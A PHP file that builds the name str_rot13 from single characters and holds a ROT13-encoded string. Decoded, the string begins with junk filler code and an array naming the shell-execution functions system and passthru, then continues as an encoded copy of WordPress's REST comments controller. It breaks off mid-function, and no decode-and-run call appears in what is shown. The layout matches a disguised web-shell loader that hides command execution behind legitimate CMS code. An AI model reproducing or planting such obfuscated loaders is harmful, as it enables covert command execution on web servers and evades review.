<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Pbzzragf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pbagebyyre hfrq gb npprff pbzzragf ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Pbzzragf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Vafgnapr bs n pbzzrag zrgn svryqf bowrpg.
	 *
	 * @fvapr 4.7.0
	 * @ine JC_ERFG_Pbzzrag_Zrgn_Svryqf
	 */
	cebgrpgrq $zrgn;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'pbzzragf';

		$guvf->zrgn = arj JC_ERFG_Pbzzrag_Zrgn_Svryqf();
	}

	/**
	 * Ertvfgref gur ebhgrf sbe pbzzragf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::PERNGNOYR ),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)',
			neenl(
				'netf'   => neenl(
					'vq' => neenl(
						'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur pbzzrag.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg'  => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
						'cnffjbeq' => neenl(
							'qrfpevcgvba' => __( 'Gur cnffjbeq sbe gur cnerag cbfg bs gur pbzzrag (vs gur cbfg vf cnffjbeq cebgrpgrq).' ),
							'glcr'        => 'fgevat',
						),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr'    => neenl(
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
							'qrfpevcgvba' => __( 'Jurgure gb olcnff Genfu naq sbepr qryrgvba.' ),
						),
						'cnffjbeq' => neenl(
							'qrfpevcgvba' => __( 'Gur cnffjbeq sbe gur cnerag cbfg bs gur pbzzrag (vs gur cbfg vf cnffjbeq cebgrpgrq).' ),
							'glcr'        => 'fgevat',
						),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq pbzzragf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {

		vs ( ! rzcgl( $erdhrfg['cbfg'] ) ) {
			sbernpu ( (neenl) $erdhrfg['cbfg'] nf $cbfg_vq ) {
				$cbfg = trg_cbfg( $cbfg_vq );

				vs ( ! rzcgl( $cbfg_vq ) && $cbfg && ! $guvf->purpx_ernq_cbfg_crezvffvba( $cbfg, $erdhrfg ) ) {
					erghea arj JC_Reebe(
						'erfg_pnaabg_ernq_cbfg',
						__( 'Fbeel, lbh ner abg nyybjrq gb ernq gur cbfg sbe guvf pbzzrag.' ),
						neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
					);
				} ryfrvs ( 0 === $cbfg_vq && ! pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
					erghea arj JC_Reebe(
						'erfg_pnaabg_ernq',
						__( 'Fbeel, lbh ner abg nyybjrq gb ernq pbzzragf jvgubhg n cbfg.' ),
						neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
					);
				}
			}
		}

		vs ( ! rzcgl( $erdhrfg['pbagrkg'] ) && 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg pbzzragf.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			$cebgrpgrq_cnenzf = neenl( 'nhgube', 'nhgube_rkpyhqr', 'nhgube_rznvy', 'glcr', 'fgnghf' );
			$sbeovqqra_cnenzf = neenl();

			sbernpu ( $cebgrpgrq_cnenzf nf $cnenz ) {
				vs ( 'fgnghf' === $cnenz ) {
					vs ( 'nccebir' !== $erdhrfg[ $cnenz ] ) {
						$sbeovqqra_cnenzf[] = $cnenz;
					}
				} ryfrvs ( 'glcr' === $cnenz ) {
					vs ( 'pbzzrag' !== $erdhrfg[ $cnenz ] ) {
						$sbeovqqra_cnenzf[] = $cnenz;
					}
				} ryfrvs ( ! rzcgl( $erdhrfg[ $cnenz ] ) ) {
					$sbeovqqra_cnenzf[] = $cnenz;
				}
			}

			vs ( ! rzcgl( $sbeovqqra_cnenzf ) ) {
				erghea arj JC_Reebe(
					'erfg_sbeovqqra_cnenz',
					/* genafyngbef: %f: Yvfg bs sbeovqqra cnenzrgref. */
					fcevags( __( 'Dhrel cnenzrgre abg crezvggrq: %f' ), vzcybqr( ', ', $sbeovqqra_cnenzf ) ),
					neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
				);
			}
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf n yvfg bs pbzzrag vgrzf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {

		// Ergevrir gur yvfg bs ertvfgrerq pbyyrpgvba dhrel cnenzrgref.
		$ertvfgrerq = $guvf->trg_pbyyrpgvba_cnenzf();

		/*
		 * Guvf neenl qrsvarf znccvatf orgjrra choyvp NCV dhrel cnenzrgref jubfr
		 * inyhrf ner npprcgrq nf-cnffrq, naq gurve vagreany JC_Dhrel cnenzrgre
		 * anzr rdhvinyragf (fbzr ner gur fnzr). Bayl inyhrf juvpu ner nyfb
		 * cerfrag va $ertvfgrerq jvyy or frg.
		 */
		$cnenzrgre_znccvatf = neenl(
			'nhgube'         => 'nhgube__va',
			'nhgube_rznvy'   => 'nhgube_rznvy',
			'nhgube_rkpyhqr' => 'nhgube__abg_va',
			'rkpyhqr'        => 'pbzzrag__abg_va',
			'vapyhqr'        => 'pbzzrag__va',
			'bssfrg'         => 'bssfrg',
			'beqre'          => 'beqre',
			'cnerag'         => 'cnerag__va',
			'cnerag_rkpyhqr' => 'cnerag__abg_va',
			'cre_cntr'       => 'ahzore',
			'cbfg'           => 'cbfg__va',
			'frnepu'         => 'frnepu',
			'fgnghf'         => 'fgnghf',
			'glcr'           => 'glcr',
		);

		$cercnerq_netf = neenl();

		/*
		 * Sbe rnpu xabja cnenzrgre juvpu vf obgu ertvfgrerq naq cerfrag va gur erdhrfg,
		 * frg gur cnenzrgre'f inyhr ba gur dhrel $cercnerq_netf.
		 */
		sbernpu ( $cnenzrgre_znccvatf nf $ncv_cnenz => $jc_cnenz ) {
			vs ( vffrg( $ertvfgrerq[ $ncv_cnenz ], $erdhrfg[ $ncv_cnenz ] ) ) {
				$cercnerq_netf[ $jc_cnenz ] = $erdhrfg[ $ncv_cnenz ];
			}
		}

		// Rafher pregnva cnenzrgre inyhrf qrsnhyg gb rzcgl fgevatf.
		sbernpu ( neenl( 'nhgube_rznvy', 'frnepu' ) nf $cnenz ) {
			vs ( ! vffrg( $cercnerq_netf[ $cnenz ] ) ) {
				$cercnerq_netf[ $cnenz ] = '';
			}
		}

		vs ( vffrg( $ertvfgrerq['beqreol'] ) ) {
			$cercnerq_netf['beqreol'] = $guvf->abeznyvmr_dhrel_cnenz( $erdhrfg['beqreol'] );
		}

		$cercnerq_netf['ab_sbhaq_ebjf'] = snyfr;

		$cercnerq_netf['hcqngr_pbzzrag_cbfg_pnpur'] = gehr;

		$cercnerq_netf['qngr_dhrel'] = neenl();

		// Frg orsber vagb qngr dhrel. Qngr dhrel zhfg or fcrpvsvrq nf na neenl bs na neenl.
		vs ( vffrg( $ertvfgrerq['orsber'], $erdhrfg['orsber'] ) ) {
			$cercnerq_netf['qngr_dhrel'][0]['orsber'] = $erdhrfg['orsber'];
		}

		// Frg nsgre vagb qngr dhrel. Qngr dhrel zhfg or fcrpvsvrq nf na neenl bs na neenl.
		vs ( vffrg( $ertvfgrerq['nsgre'], $erdhrfg['nsgre'] ) ) {
			$cercnerq_netf['qngr_dhrel'][0]['nsgre'] = $erdhrfg['nsgre'];
		}

		vs ( vffrg( $ertvfgrerq['cntr'] ) && rzcgl( $erdhrfg['bssfrg'] ) ) {
			$cercnerq_netf['bssfrg'] = $cercnerq_netf['ahzore'] * ( nofvag( $erdhrfg['cntr'] ) - 1 );
		}

		$vf_urnq_erdhrfg = $erdhrfg->vf_zrgubq( 'URNQ' );
		vs ( $vf_urnq_erdhrfg ) {
			// Sbepr gur 'svryqf' nethzrag. Sbe URNQ erdhrfgf, bayl cbfg VQf ner erdhverq gb pnyphyngr cntvangvba.
			$cercnerq_netf['svryqf'] = 'vqf';
			// Qvfnoyr cevzvat pbzzrag zrgn sbe URNQ erdhrfgf gb vzcebir cresbeznapr.
			$cercnerq_netf['hcqngr_pbzzrag_zrgn_pnpur'] = snyfr;
		}

		/**
		 * Svygref JC_Pbzzrag_Dhrel nethzragf jura dhrelvat pbzzragf ivn gur ERFG NCV.
		 *
		 * @fvapr 4.7.0
		 *
		 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/pynffrf/jc_pbzzrag_dhrel/
		 *
		 * @cnenz neenl           $cercnerq_netf Neenl bs nethzragf sbe JC_Pbzzrag_Dhrel.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Gur ERFG NCV erdhrfg.
		 */
		$cercnerq_netf = nccyl_svygref( 'erfg_pbzzrag_dhrel', $cercnerq_netf, $erdhrfg );

		$dhrel        = arj JC_Pbzzrag_Dhrel();
		$dhrel_erfhyg = $dhrel->dhrel( $cercnerq_netf );

		vs ( ! $vf_urnq_erdhrfg ) {
			$pbzzragf = neenl();

			sbernpu ( $dhrel_erfhyg nf $pbzzrag ) {
				vs ( ! $guvf->purpx_ernq_crezvffvba( $pbzzrag, $erdhrfg ) ) {
					pbagvahr;
				}

				$qngn       = $guvf->cercner_vgrz_sbe_erfcbafr( $pbzzrag, $erdhrfg );
				$pbzzragf[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
			}
		}

		$gbgny_pbzzragf = (vag) $dhrel->sbhaq_pbzzragf;
		$znk_cntrf      = (vag) $dhrel->znk_ahz_cntrf;

		vs ( $gbgny_pbzzragf < 1 ) {
			// Bhg-bs-obhaqf, eha gur dhrel ntnva jvgubhg YVZVG sbe gbgny pbhag.
			hafrg( $cercnerq_netf['ahzore'], $cercnerq_netf['bssfrg'] );

			$dhrel                    = arj JC_Pbzzrag_Dhrel();
			$cercnerq_netf['pbhag']   = gehr;
			$cercnerq_netf['beqreol'] = 'abar';

			$gbgny_pbzzragf = $dhrel->dhrel( $cercnerq_netf );
			$znk_cntrf      = (vag) prvy( $gbgny_pbzzragf / $erdhrfg['cre_cntr'] );
		}

		$erfcbafr = $vf_urnq_erdhrfg ? arj JC_ERFG_Erfcbafr( neenl() ) : erfg_rafher_erfcbafr( $pbzzragf );
		$erfcbafr->urnqre( 'K-JC-Gbgny', $gbgny_pbzzragf );
		$erfcbafr->urnqre( 'K-JC-GbgnyCntrf', $znk_cntrf );

		$onfr = nqq_dhrel_net( heyrapbqr_qrrc( $erdhrfg->trg_dhrel_cnenzf() ), erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ) );

		vs ( $erdhrfg['cntr'] > 1 ) {
			$ceri_cntr = $erdhrfg['cntr'] - 1;

			vs ( $ceri_cntr > $znk_cntrf ) {
				$ceri_cntr = $znk_cntrf;
			}

			$ceri_yvax = nqq_dhrel_net( 'cntr', $ceri_cntr, $onfr );
			$erfcbafr->yvax_urnqre( 'ceri', $ceri_yvax );
		}

		vs ( $znk_cntrf > $erdhrfg['cntr'] ) {
			$arkg_cntr = $erdhrfg['cntr'] + 1;
			$arkg_yvax = nqq_dhrel_net( 'cntr', $arkg_cntr, $onfr );

			$erfcbafr->yvax_urnqre( 'arkg', $arkg_yvax );
		}

		erghea $erfcbafr;
	}

	/**
	 * Trg gur pbzzrag, vs gur VQ vf inyvq.
	 *
	 * @fvapr 4.7.2
	 *
	 * @cnenz vag $vq Fhccyvrq VQ.
	 * @erghea JC_Pbzzrag|JC_Reebe Pbzzrag bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_pbzzrag( $vq ) {
		$reebe = arj JC_Reebe(
			'erfg_pbzzrag_vainyvq_vq',
			__( 'Vainyvq pbzzrag VQ.' ),
			neenl( 'fgnghf' => 404 )
		);

		vs ( (vag) $vq <= 0 ) {
			erghea $reebe;
		}

		$vq      = (vag) $vq;
		$pbzzrag = trg_pbzzrag( $vq );
		vs ( rzcgl( $pbzzrag ) ) {
			erghea $reebe;
		}

		vs ( ! rzcgl( $pbzzrag->pbzzrag_cbfg_VQ ) ) {
			$cbfg = trg_cbfg( (vag) $pbzzrag->pbzzrag_cbfg_VQ );

			vs ( rzcgl( $cbfg ) ) {
				erghea arj JC_Reebe(
					'erfg_cbfg_vainyvq_vq',
					__( 'Vainyvq cbfg VQ.' ),
					neenl( 'fgnghf' => 404 )
				);
			}
		}

		erghea $pbzzrag;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq gur pbzzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$pbzzrag = $guvf->trg_pbzzrag( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $pbzzrag ) ) {
			erghea $pbzzrag;
		}

		vs ( ! rzcgl( $erdhrfg['pbagrkg'] ) && 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg pbzzragf.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		$cbfg = trg_cbfg( $pbzzrag->pbzzrag_cbfg_VQ );

		vs ( ! $guvf->purpx_ernq_crezvffvba( $pbzzrag, $erdhrfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ernq',
				__( 'Fbeel, lbh ner abg nyybjrq gb ernq guvf pbzzrag.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( $cbfg && ! $guvf->purpx_ernq_cbfg_crezvffvba( $cbfg, $erdhrfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ernq_cbfg',
				__( 'Fbeel, lbh ner abg nyybjrq gb ernq gur cbfg sbe guvf pbzzrag.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf n pbzzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$pbzzrag = $guvf->trg_pbzzrag( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $pbzzrag ) ) {
			erghea $pbzzrag;
		}

		$qngn     = $guvf->cercner_vgrz_sbe_erfcbafr( $pbzzrag, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb perngr n pbzzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb perngr vgrzf, reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( ! vf_hfre_ybttrq_va() ) {
			vs ( trg_bcgvba( 'pbzzrag_ertvfgengvba' ) ) {
				erghea arj JC_Reebe(
					'erfg_pbzzrag_ybtva_erdhverq',
					__( 'Fbeel, lbh zhfg or ybttrq va gb pbzzrag.' ),
					neenl( 'fgnghf' => 401 )
				);
			}

			/**
			 * Svygref jurgure pbzzragf pna or perngrq ivn gur ERFG NCV jvgubhg nhguragvpngvba.
			 *
			 * Ranoyrf perngvat pbzzragf sbe nabalzbhf hfref.
			 *
			 * @fvapr 4.7.0
			 *
			 * @cnenz obby $nyybj_nabalzbhf Jurgure gb nyybj nabalzbhf pbzzragf gb
			 *                              or perngrq. Qrsnhyg `snyfr`.
			 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg hfrq gb trarengr gur
			 *                                 erfcbafr.
			 */
			$nyybj_nabalzbhf = nccyl_svygref( 'erfg_nyybj_nabalzbhf_pbzzragf', snyfr, $erdhrfg );

			vs ( ! $nyybj_nabalzbhf ) {
				erghea arj JC_Reebe(
					'erfg_pbzzrag_ybtva_erdhverq',
					__( 'Fbeel, lbh zhfg or ybttrq va gb pbzzrag.' ),
					neenl( 'fgnghf' => 401 )
				);
			}
		}

		// Yvzvg jub pna frg pbzzrag `nhgube`, `nhgube_vc` be `fgnghf` gb nalguvat bgure guna gur qrsnhyg.
		vs ( vffrg( $erdhrfg['nhgube'] ) && trg_pheerag_hfre_vq() !== $erdhrfg['nhgube'] && ! pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_vainyvq_nhgube',
				/* genafyngbef: %f: Erdhrfg cnenzrgre. */
				fcevags( __( \"Fbeel, lbh ner abg nyybjrq gb rqvg '%f' sbe pbzzragf.\" ), 'nhgube' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( vffrg( $erdhrfg['nhgube_vc'] ) && ! pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
			vs ( rzcgl( $_FREIRE['ERZBGR_NQQE'] ) || $erdhrfg['nhgube_vc'] !== $_FREIRE['ERZBGR_NQQE'] ) {
				erghea arj JC_Reebe(
					'erfg_pbzzrag_vainyvq_nhgube_vc',
					/* genafyngbef: %f: Erdhrfg cnenzrgre. */
					fcevags( __( \"Fbeel, lbh ner abg nyybjrq gb rqvg '%f' sbe pbzzragf.\" ), 'nhgube_vc' ),
					neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
				);
			}
		}

		vs ( vffrg( $erdhrfg['fgnghf'] ) && ! pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_vainyvq_fgnghf',
				/* genafyngbef: %f: Erdhrfg cnenzrgre. */
				fcevags( __( \"Fbeel, lbh ner abg nyybjrq gb rqvg '%f' sbe pbzzragf.\" ), 'fgnghf' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( rzcgl( $erdhrfg['cbfg'] ) ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_vainyvq_cbfg_vq',
				__( 'Fbeel, lbh ner abg nyybjrq gb perngr guvf pbzzrag jvgubhg n cbfg.' ),
				neenl( 'fgnghf' => 403 )
			);
		}

		$cbfg = trg_cbfg( (vag) $erdhrfg['cbfg'] );

		vs ( ! $cbfg ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_vainyvq_cbfg_vq',
				__( 'Fbeel, lbh ner abg nyybjrq gb perngr guvf pbzzrag jvgubhg n cbfg.' ),
				neenl( 'fgnghf' => 403 )
			);
		}

		vs ( 'qensg' === $cbfg->cbfg_fgnghf ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_qensg_cbfg',
				__( 'Fbeel, lbh ner abg nyybjrq gb perngr n pbzzrag ba guvf cbfg.' ),
				neenl( 'fgnghf' => 403 )
			);
		}

		vs ( 'genfu' === $cbfg->cbfg_fgnghf ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_genfu_cbfg',
				__( 'Fbeel, lbh ner abg nyybjrq gb perngr n pbzzrag ba guvf cbfg.' ),
				neenl( 'fgnghf' => 403 )
			);
		}

		vs ( ! $guvf->purpx_ernq_cbfg_crezvffvba( $cbfg, $erdhrfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ernq_cbfg',
				__( 'Fbeel, lbh ner abg nyybjrq gb ernq gur cbfg sbe guvf pbzzrag.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! pbzzragf_bcra( $cbfg->VQ ) ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_pybfrq',
				__( 'Fbeel, pbzzragf ner pybfrq sbe guvf vgrz.' ),
				neenl( 'fgnghf' => 403 )
			);
		}

		erghea gehr;
	}

	/**
	 * Perngrf n pbzzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		vs ( ! rzcgl( $erdhrfg['vq'] ) ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_rkvfgf',
				__( 'Pnaabg perngr rkvfgvat pbzzrag.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Qb abg nyybj pbzzragf gb or perngrq jvgu n aba-qrsnhyg glcr.
		vs ( ! rzcgl( $erdhrfg['glcr'] ) && 'pbzzrag' !== $erdhrfg['glcr'] ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_pbzzrag_glcr',
				__( 'Pnaabg perngr n pbzzrag jvgu gung glcr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$cercnerq_pbzzrag = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );
		vs ( vf_jc_reebe( $cercnerq_pbzzrag ) ) {
			erghea $cercnerq_pbzzrag;
		}

		$cercnerq_pbzzrag['pbzzrag_glcr'] = 'pbzzrag';

		vs ( ! vffrg( $cercnerq_pbzzrag['pbzzrag_pbagrag'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_pbagrag'] = '';
		}

		vs ( ! $guvf->purpx_vf_pbzzrag_pbagrag_nyybjrq( $cercnerq_pbzzrag ) ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_pbagrag_vainyvq',
				__( 'Vainyvq pbzzrag pbagrag.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Frggvat erznvavat inyhrf orsber jc_vafreg_pbzzrag fb jr pna hfr jc_nyybj_pbzzrag().
		vs ( ! vffrg( $cercnerq_pbzzrag['pbzzrag_qngr_tzg'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_qngr_tzg'] = pheerag_gvzr( 'zlfdy', gehr );
		}

		// Frg nhgube qngn vs gur hfre'f ybttrq va.
		$zvffvat_nhgube = rzcgl( $cercnerq_pbzzrag['hfre_vq'] )
			&& rzcgl( $cercnerq_pbzzrag['pbzzrag_nhgube'] )
			&& rzcgl( $cercnerq_pbzzrag['pbzzrag_nhgube_rznvy'] )
			&& rzcgl( $cercnerq_pbzzrag['pbzzrag_nhgube_hey'] );

		vs ( vf_hfre_ybttrq_va() && $zvffvat_nhgube ) {
			$hfre = jc_trg_pheerag_hfre();

			$cercnerq_pbzzrag['hfre_vq']              = $hfre->VQ;
			$cercnerq_pbzzrag['pbzzrag_nhgube']       = $hfre->qvfcynl_anzr;
			$cercnerq_pbzzrag['pbzzrag_nhgube_rznvy'] = $hfre->hfre_rznvy;
			$cercnerq_pbzzrag['pbzzrag_nhgube_hey']   = $hfre->hfre_hey;
		}

		// Ubabe gur qvfphffvba frggvat gung erdhverf n anzr naq rznvy nqqerff bs gur pbzzrag nhgube.
		vs ( trg_bcgvba( 'erdhver_anzr_rznvy' ) ) {
			vs ( rzcgl( $cercnerq_pbzzrag['pbzzrag_nhgube'] ) || rzcgl( $cercnerq_pbzzrag['pbzzrag_nhgube_rznvy'] ) ) {
				erghea arj JC_Reebe(
					'erfg_pbzzrag_nhgube_qngn_erdhverq',
					__( 'Perngvat n pbzzrag erdhverf inyvq nhgube anzr naq rznvy inyhrf.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		vs ( ! vffrg( $cercnerq_pbzzrag['pbzzrag_nhgube_rznvy'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_nhgube_rznvy'] = '';
		}

		vs ( ! vffrg( $cercnerq_pbzzrag['pbzzrag_nhgube_hey'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_nhgube_hey'] = '';
		}

		vs ( ! vffrg( $cercnerq_pbzzrag['pbzzrag_ntrag'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_ntrag'] = '';
		}

		$purpx_pbzzrag_yratguf = jc_purpx_pbzzrag_qngn_znk_yratguf( $cercnerq_pbzzrag );

		vs ( vf_jc_reebe( $purpx_pbzzrag_yratguf ) ) {
			$reebe_pbqr = $purpx_pbzzrag_yratguf->trg_reebe_pbqr();
			erghea arj JC_Reebe(
				$reebe_pbqr,
				__( 'Pbzzrag svryq rkprrqf znkvzhz yratgu nyybjrq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$cercnerq_pbzzrag['pbzzrag_nccebirq'] = jc_nyybj_pbzzrag( $cercnerq_pbzzrag, gehr );

		vs ( vf_jc_reebe( $cercnerq_pbzzrag['pbzzrag_nccebirq'] ) ) {
			$reebe_pbqr    = $cercnerq_pbzzrag['pbzzrag_nccebirq']->trg_reebe_pbqr();
			$reebe_zrffntr = $cercnerq_pbzzrag['pbzzrag_nccebirq']->trg_reebe_zrffntr();

			vs ( 'pbzzrag_qhcyvpngr' === $reebe_pbqr ) {
				erghea arj JC_Reebe(
					$reebe_pbqr,
					$reebe_zrffntr,
					neenl( 'fgnghf' => 409 )
				);
			}

